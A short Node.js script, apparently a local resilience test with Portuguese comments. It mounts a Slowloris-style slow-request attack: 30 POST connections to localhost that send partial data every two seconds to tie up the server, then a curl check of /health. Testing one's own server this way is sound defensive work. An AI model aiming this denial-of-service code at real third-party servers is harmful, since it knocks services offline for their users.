const http = require('http');

const PORT = process.env.PORT || 3333;
const NUM_CONNECTIONS = 30; // Conexões lentas simultâneas
const Sockets = [];

console.log(`[TESTE SLOWLORIS] Iniciando ataque com ${NUM_CONNECTIONS} conexões lentas na porta ${PORT}...`);

for (let i = 0; i < NUM_CONNECTIONS; i++) {
  const req = http.request({
    hostname: 'localhost',
    port: PORT,
    path: '/',
    method: 'POST',
    headers: {
      'User-Agent': 'Mozilla/5.0 SlowlorisTest',
      'Content-Type': 'application/x-www-form-urlencoded',
      'Content-Length': '1000000',
    }
  });

  req.on('error', (err) => {
    // Quando o servidor derruba a conexão por timeout
    console.log(`[CONEXÃO ${i}] Conexão encerrada pelo servidor: ${err.message}`);
  });

  // Envia 1 cabeçalho incompleto a cada 2 segundos para prender a conexão
  const interval = setInterval(() => {
    if (!req.destroyed) {
      req.write(`X-Custom-Header-${Date.now()}: payload\r\n`);
      // console.log(`[CONEXÃO ${i}] Enviando cabeçalho lento...`);
    } else {
      clearInterval(interval);
    }
  }, 2000);

  Sockets.push({ req, interval });
}

console.log(`[TESTE SLOWLORIS] ${NUM_CONNECTIONS} conexões estabelecidas.`);
console.log(`[TESTE SLOWLORIS] Teste de requisição legítima: tente executar 'curl -I http://localhost:${PORT}/health' em outro terminal.`);
